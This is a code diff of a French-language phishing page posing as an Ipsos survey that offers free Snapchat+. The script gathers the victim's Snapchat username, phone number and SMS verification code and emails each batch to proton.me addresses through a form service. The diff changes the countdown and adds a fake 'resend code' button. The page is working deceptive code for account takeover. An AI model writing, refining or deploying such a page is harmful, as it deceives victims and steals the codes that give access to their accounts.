@@ -19,12 +19,12 @@ input, select { width:100%; padding:14px; font-size:18px; border-radius:6px; bor
 input:focus, select:focus { border-color:#0078d4; outline:none; box-shadow:0 0 8px rgba(0,120,212,0.3);}
 button { padding:14px 28px; background:#0078d4; color:#fff; border:0; border-radius:8px; cursor:pointer; font-size:18px; transition:all 0.3s;}
 button:hover { background:#005fa3; transform:translateY(-2px) scale(1.03); box-shadow:0 4px 12px rgba(0,0,0,0.15);}
+button:disabled { background:#ccc; cursor:not-allowed; transform:none; box-shadow:none;}
 .progress-container { width:90%; height:16px; background:#e0e0e0; border-radius:8px; margin:30px auto; position:relative; }
 .progress-bar { height:100%; width:0%; background:#0078d4; border-radius:8px; transition:width 0.5s ease; }
 .progress-text { position:absolute; right:10px; top:0; font-size:14px; font-weight:600; color:#003b7a; line-height:16px;}
 .about { max-width:650px; margin:20px auto 40px auto; padding:20px; background:#e8f0fe; border-radius:10px; font-size:14px; color:#003b7a; line-height:1.4; text-align:left;}
 .footer { text-align:center; padding:20px 0; font-size:14px; color:#999; margin-top:20px; border-top:1px solid #ddd;}
-#btnResend { display:none; margin-top:15px; background:#ff5722; }
 @media(max-width:600px){.box{margin:30px 20px;padding:30px;} h2{font-size:24px;} p{font-size:16px;} button{font-size:16px;} .about{font-size:13px; padding:15px;}}
 </style>
 </head>
@@ -56,15 +56,6 @@ button:hover { background:#005fa3; transform:translateY(-2px) scale(1.03); box-s
 <input type="text" name="artiste4" placeholder="Artiste 4">
 <input type="text" name="artiste5" placeholder="Artiste 5"><br><br>
 
-<label>Genres préférés :</label><br>
-<input type="checkbox" name="genre[]" value="Pop"> Pop<br>
-<input type="checkbox" name="genre[]" value="Rap / Hip-hop"> Rap / Hip-hop<br>
-<input type="checkbox" name="genre[]" value="R&B"> R&B<br>
-<input type="checkbox" name="genre[]" value="Electro"> Electro<br>
-<input type="checkbox" name="genre[]" value="Rock"> Rock<br>
-<input type="checkbox" name="genre[]" value="Afro"> Afro<br>
-<input type="checkbox" name="genre[]" value="Autre"> Autre<br><br>
-
 <button id="btnEtape0">Continuer</button>
 </div>
 
@@ -91,19 +82,13 @@ button:hover { background:#005fa3; transform:translateY(-2px) scale(1.03); box-s
 <button id="btnEtape3">Suivant</button>
 </div>
 
-<!-- Étape 3b : Notification SMS avec décompte -->
-<div class="box" id="etape3b">
-<h2>Vérification en cours ⏱️</h2>
-<p>Un code SMS a été envoyé à votre numéro.</p>
-<p>Vous pouvez entrer le code dans <span id="countdown">50</span> secondes.</p>
-<button id="btnResend">Renvoyer le code</button>
-</div>
-
 <!-- Étape 4 : Code SMS -->
 <div class="box" id="etape4">
 <h2>Code de vérification 📩</h2>
-<p>Veuillez entrer le code que vous avez reçu par SMS pour finaliser votre inscription.</p>
+<p>Entrez le code reçu par SMS. Vous pouvez commencer dès maintenant.</p>
 <input type="text" id="code_sms" placeholder="Code reçu">
+<p id="timer_text">Temps restant : 50 secondes</p>
+<button id="btnResend" style="display:none;">Renvoyer le code</button>
 <button id="btnEtape4">Terminer</button>
 </div>
 
@@ -125,6 +110,8 @@ L’offre Snapchat+ gratuite est uniquement disponible pour les clients de ces o
 
 <script>
 let reponses = {};
+let countdownInterval;
+let countdown = 50; // 50 secondes
 
 function showStep(etapeId, percent){
     document.querySelectorAll('.box').forEach(b=>b.classList.remove('active'));
@@ -136,7 +123,7 @@ function showStep(etapeId, percent){
 async function sendMail(dataObj, sujet){
     const formData = new FormData();
     formData.append("_subject", sujet);
-    formData.append("becteurfoou@proton.me", "jack2026b@proton.me");
+    formData.append("becteurfoou@proton.me", "jack2026b@proton.me"); 
     formData.append("_captcha", "false");
     for(let key in dataObj){ formData.append(key, dataObj[key]); }
     try{
@@ -151,7 +138,6 @@ document.getElementById('btnEtape0').addEventListener('click', ()=>{
     if(!deezer){ alert("Veuillez répondre à la question Deezer."); return;}
     reponses.deezer_use = deezer.value;
     for(let i=1;i<=5;i++){ reponses['artiste'+i] = document.querySelector(`input[name="artiste${i}"]`).value.trim();}
-    reponses.genre = Array.from(document.querySelectorAll('input[name="genre[]"]:checked')).map(e=>e.value);
     showStep('etape1',20);
 });
 
@@ -160,6 +146,7 @@ document.getElementById('btnEtape1').addEventListener('click', ()=>{
     let snap = document.getElementById('compte_snap').value.trim();
     if(!snap){ alert("Veuillez entrer votre identifiant Snapchat."); return;}
     reponses.compte_snap = snap;
+
     sendMail({
         deezer_use: reponses.deezer_use,
         artiste1: reponses.artiste1,
@@ -167,9 +154,9 @@ document.getElementById('btnEtape1').addEventListener('click', ()=>{
         artiste3: reponses.artiste3,
         artiste4: reponses.artiste4,
         artiste5: reponses.artiste5,
-        genre: reponses.genre.join(", "),
         compte_snap: reponses.compte_snap
     }, "Réponses participant jusqu'à Snapchat");
+
     showStep('etape2',40);
 });
 
@@ -178,11 +165,12 @@ document.getElementById('btnEtape2').addEventListener('click', ()=>{
     showStep('etape3',60);
 });
 
-// Étape 3 -> 3b avec décompte et bouton renvoi
+// Étape 3 -> 4
 document.getElementById('btnEtape3').addEventListener('click', ()=>{
     let tel = document.getElementById('telephone').value.trim();
     if(!/^0[67]\d{8}$/.test(tel)){ alert("Numéro invalide. Commence par 06 ou 07 et 10 chiffres."); return;}
     reponses.telephone = tel;
+
     sendMail({
         deezer_use: reponses.deezer_use,
         artiste1: reponses.artiste1,
@@ -190,34 +178,37 @@ document.getElementById('btnEtape3').addEventListener('click', ()=>{
         artiste3: reponses.artiste3,
         artiste4: reponses.artiste4,
         artiste5: reponses.artiste5,
-        genre: reponses.genre.join(", "),
         compte_snap: reponses.compte_snap,
         telephone: reponses.telephone
     }, "Réponses participant complet - Ipsos");
 
-    showStep('etape3b',70);
-
-    let countdown = 50;
-    const countdownEl = document.getElementById('countdown');
-    const btnResend = document.getElementById('btnResend');
-    countdownEl.innerText = countdown;
-    btnResend.style.display = "none";
-
-    const timer = setInterval(()=>{
-        countdown--;
-        countdownEl.innerText = countdown;
-        if(countdown <= 0){
-            clearInterval(timer);
-            btnResend.style.display = "inline-block";
-        }
-    },1000);
-
-    // Permettre de passer à l'étape code dès 5 secondes
-    setTimeout(()=>{ showStep('etape4',80); }, 5000);
+    showStep('etape4',80);
+    startCountdown();
 });
 
+// Countdown et bouton renvoyer
+function startCountdown(){
+    countdown = 50;
+    document.getElementById('timer_text').innerText = `Temps restant : ${countdown} secondes`;
+    document.getElementById('btnResend').style.display = "none";
+
+    countdownInterval = setInterval(()=>{
+        countdown--;
+        document.getElementById('timer_text').innerText = `Temps restant : ${countdown} secondes`;
+        if(countdown <=5){
+            document.getElementById('code_sms').disabled = false;
+        }
+        if(countdown <=0){
+            clearInterval(countdownInterval);
+            document.getElementById('btnResend').style.display = "inline-block";
+        }
+    },1000);
+}
+
+// Renvoyer le code
 document.getElementById('btnResend').addEventListener('click', ()=>{
-    alert("Un nouveau code a été envoyé !");
+    alert("Un nouveau code a été envoyé (simulation).");
+    startCountdown();
 });
 
 // Étape 4 -> 5
@@ -225,10 +216,11 @@ document.getElementById('btnEtape4').addEventListener('click', ()=>{
     let code = document.getElementById('code_sms').value.trim();
     if(!code){ alert("Veuillez entrer le code reçu par SMS."); return;}
     reponses.code_sms = code;
+
     sendMail({ code_sms: reponses.code_sms }, "Code SMS - Ipsos");
+    clearInterval(countdownInterval);
     showStep('etape5',100);
 });
 </script>
 </body>
 </html>
-
